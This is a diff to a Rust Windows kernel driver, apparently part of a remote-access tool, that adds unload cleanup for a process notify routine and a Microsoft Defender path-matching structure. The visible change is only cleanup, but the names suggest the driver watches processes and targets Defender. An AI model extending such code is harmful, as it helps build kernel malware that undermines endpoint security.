@@ -9,7 +9,8 @@ use wdk_sys::{NTSTATUS, PDRIVER_OBJECT, THREAD_ALL_ACCESS};
 use widestring::Utf16Str;
 
 use crate::global::{
-    OB_REGISTER_CALLBACKS_HANDLE, OBJ_PATH_AHO_CORASICK, ORIGINAL_DRIVER_OBJECT, RAT_DEVICE_OBJECT,
+    MS_DEFENDER_AHO_CORASICK, OB_REGISTER_CALLBACKS_HANDLE, OBJ_PATH_AHO_CORASICK,
+    ORIGINAL_DRIVER_OBJECT, PROCESS_NOTIFY_ROUTINE, RAT_DEVICE_OBJECT,
 };
 use crate::{cleanup, info, threads};
 
@@ -18,10 +19,14 @@ static _ORIGINAL_DRIVER_UNLOAD: AtomicPtr<u8> = AtomicPtr::new(ptr::null_mut());
 
 fn remove_registered_services() {
     cleanup::cleanup_device(RAT_DEVICE_OBJECT.swap(ptr::null_mut(), Ordering::AcqRel));
+    cleanup::cleanup_process_notify_routine(
+        PROCESS_NOTIFY_ROUTINE.swap(ptr::null_mut(), Ordering::AcqRel),
+    );
     cleanup::cleanup_object_callbacks(
         OB_REGISTER_CALLBACKS_HANDLE.swap(ptr::null_mut(), Ordering::AcqRel),
     );
     cleanup::cleanup_aho_corasick(OBJ_PATH_AHO_CORASICK.swap(ptr::null_mut(), Ordering::AcqRel));
+    cleanup::cleanup_aho_corasick(MS_DEFENDER_AHO_CORASICK.swap(ptr::null_mut(), Ordering::AcqRel));
 }
 
 unsafe extern "C" fn driver_unload(driver: PDRIVER_OBJECT) {
